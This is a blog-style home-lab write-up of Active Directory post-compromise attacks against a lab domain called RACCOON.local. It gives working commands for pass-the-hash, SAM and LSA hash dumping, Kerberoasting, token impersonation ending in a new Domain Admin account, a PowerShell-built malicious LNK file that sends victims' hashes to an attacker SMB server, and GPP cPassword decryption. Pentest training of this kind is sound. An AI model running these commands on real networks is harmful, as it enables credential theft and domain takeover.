---
layout: single
title: "Post-Compromise Attacks in AD"
date: 2024-10-05
categories:
  - Active Directory
tags:
  - AD
  - Post-Compromise
permalink: /projects/ad-hacking-home-lab/post-compromise-attacks/
order: 3
---

## Attack 1: Pass the hash

- it’s used a lot for pivoting after gaining access to the AD so using a compromised account obviously

```jsx
crackmapexec smb 192.168.52.0/24 -u credfield -d RACCOON.local -p Password1
```

![AD-PC-A-01](/assets/images/AD-images/AD-PC-A-01.png)

- we can also take the hash from dumping tool like [secretsdump.py](http://secretsdump.py)

```jsx
secretsdump.py RACCOON.local/credfield:Password1@192.168.52.139
```

![AD-PC-A-02](/assets/images/AD-images/AD-PC-A-02.png)


- then passing the hash

```jsx
crackmapexec smb 192.168.52.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:5b4c6335673a75f13ed948e848f00840 --local-auth
```

![AD-PC-A-03](/assets/images/AD-images/AD-PC-A-03.png)


- we could also dump sam hashes of every machine we connect to

```jsx
crackmapexec smb 192.168.52.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:5b4c6335673a75f13ed948e848f00840 --local-auth --sam
```

![AD-PC-A-04](/assets/images/AD-images/AD-PC-A-04.png)


- We can also list the shares

```jsx
crackmapexec smb 192.168.52.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:5b4c6335673a75f13ed948e848f00840 --local-auth --shares
```

- There is also a super option that enumerates lsassy, using that we can see if there are some other credentials that we normally can’t get anywhere else using the -M —lassy option, it also dumps ntlm hashes that can be cracked.
- another option the the —lsa it dumps lsa secrets and hackable ntlm hashes.

### Dumping and cracking the hashes

- we can use secretsdump to dump hashes using either the password or the hash.

```jsx
secretsdump.py RACCOON.local/credfield:Password1@192.168.52.139
```

```jsx
secretsdump.py administrator:@192.168.52.139 -hashes aad3b435b51404eeaad3b435b51404ee:5b4c6335673a75f13ed948e848f00840
```

- what’s important is the sam hashes so we can then crack the ntlm hash using john or hashcat.

## Attack 2: Kerberoasting

- The goal of kerberoasting is to get the TGS and decrypt server’s account hash

 

1. (User to DC) Request TGT. provide NTLM hash
2. (DC to User) Receive TGT enc w/ krbtgt hash
3. (User to DC) Request TGS for Server (Presents TGT)
4. (DC to User) Receive TGS enc w/ server’s account hash
5. (User to App Server) Present TGS for service enc w/ server’s account
6. (App Server to User) Used when mutual authentication is required

- get the service account hash using this command then crack it.

```jsx
sudo GetUserSPNs.py RACCOON.local/credfield:Password1 -dc-ip 192.168.52.138 -request
```

![AD-PC-A-05](/assets/images/AD-images/AD-PC-A-05.png)


## Attack 3 : Token impersonation

- Tokens are temporary keys that allow you access to a system/network without having to provide credentials each time you access a file. Think cookies for computers.
- There are two types :
1. Delegate : created for logging into a machine or using remote desktop.
2. Impersonate : “non-interactive” such as attacking a network drive or a domain logon script.
- So basically we take advantage of a compromised user to impersonate other users and eventually add an admin user for easier usage
- The first step is to use a metasploit exploit psexec (or the standalone tool) on the user machine, again, i had to turn off windows defender.


![AD-PC-A-06](/assets/images/AD-images/AD-PC-A-06.png)


- Then we load the Incognito mode for this specific attack.

```bash
load incognito
#to list the tokens
list_tokens -u
#to impersonate a token
impersonate_token RACCOON\\credfield
```

![AD-PC-A-07](/assets/images/AD-images/AD-PC-A-07.png)


- to reverse to the older user (token)

```bash
rev2self
#check 
getuid
```

- If i sign out and login as administrator it’s going to catch that in the listed tokens, so we impersonate it using the same method (command)
- after that we simply add a new user then add it to the “Domain Admins”

```bash
#add a new user
net user /add lkennedy Password1@ /domain
#add it to admins group
net group "Domain Admins" lkennedy /ADD /DOMAIN
```

![AD-PC-A-08](/assets/images/AD-images/AD-PC-A-08.png)


- To check we can simply user secretsdump and since lkennedy is in the Domain Admins group it will dump the hashes.

## Attack 4 : LNK file attacks

- Putting a malicious file in a shared folder can lead to great things!
- first create this in a powershell environment

```bash
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\test.lnk")
$lnk.TargetPath = "\\192.168.138.149\@test.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()
```

![AD-PC-A-09](/assets/images/AD-images/AD-PC-A-09.jpg)


- We copy that tagged file into the share “hackme”, but before that we make sure to rename the file to “@test” so it always stays on top.
- when a user opens a share containing that file it will immediately catch their hash and share it on our server, we could either do it the manual way and use responder to get the hashes or use NetExec as below.

```bash
NetExec smb 192.168.52.139 -d raccoon.local -u credfield -p Password1 -M slinky -o NAME=test SERVER=192.168.52.132
```

- This will automatically dump the file in an open share when it finds it.

## Attack 5 : GPP / cPassword attack (old)

- Group Policy Preferences (GPP) allowed admins to create policies using embedded credentials.
- These credentials were encrypted and placed in a “cPassword”.
- The key was accidentally released.
- Patched in MS14-025, but it doesn’t prevent previous uses.
- still relevant on pentests.
- You probably still find the xml files containing encrypted cpasswords and we can decrypt it using gpp-decrypt.
- There is the attack in metasploit that enumerates the xml files and dumps and decrypts the cpasswords.
- To mitigate patch AND delete the old GPP xml files stored in the SYSVOL

## Post-Compromise attack strategy :

Search the quick wins

1. Kerberoasting
2. Secretsdump
3. Pass the hash / pass the password

No quick wins? dig deep

1. Enumerate (bloodhund etc)
2. Where does the compromised account have access to?
3. Old vulnerabilities die hard

Think outside the box.